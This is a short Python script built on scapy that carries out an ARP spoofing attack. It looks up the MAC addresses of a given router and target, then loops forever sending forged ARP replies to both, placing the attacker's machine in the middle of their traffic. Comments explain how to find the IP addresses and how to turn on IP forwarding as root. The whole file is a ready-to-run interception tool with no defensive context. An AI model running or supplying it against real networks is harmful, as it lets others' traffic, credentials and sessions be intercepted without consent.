import scapy.all as scapy
import sys
import time


def get_mac_address(ip_address):
	broadcast_layer = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
	arp_layer = scapy.ARP(pdst=ip_address)
	get_mac_packet = broadcast_layer/arp_layer
	answer = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]		#sends and receives the response
	return answer[0][1].hwsrc 	#fetching mac address of the target machine from the above response


def spoof(router_ip, target_ip, router_mac, target_mac):
	packet1 = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip) 	#goes to router from target machine
	packet2 = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip)	#goes to target machine from router
	scapy.send(packet1)
	scapy.send(packet2)


target_ip = str(sys.argv[2]) 	#storing the second input in command line as our target ip
router_ip = str(sys.argv[1])	#storing the first input in command line as our router ip
target_mac = str(get_mac_address(target_ip))		#getting target mac address from the target ip
router_mac = str(get_mac_address(router_ip))		#getting router mac address from the router ip

#use ipconfig to find target_ip 
#use netstat -nr to find the router_ip
#before using this tool type the following using root priv: sudo echo 1 >> /proc/sys/net/ipv4/ip_forward
 
try:
	while True:
		spoof(router_ip, target_ip, router_mac, target_mac)
		time.sleep(2) 	#sleep for 2 seconds after sending one arp packet
except KeyboardInterrupt:
	print("[+] Closing ARP Spoofer")
	exit(0)

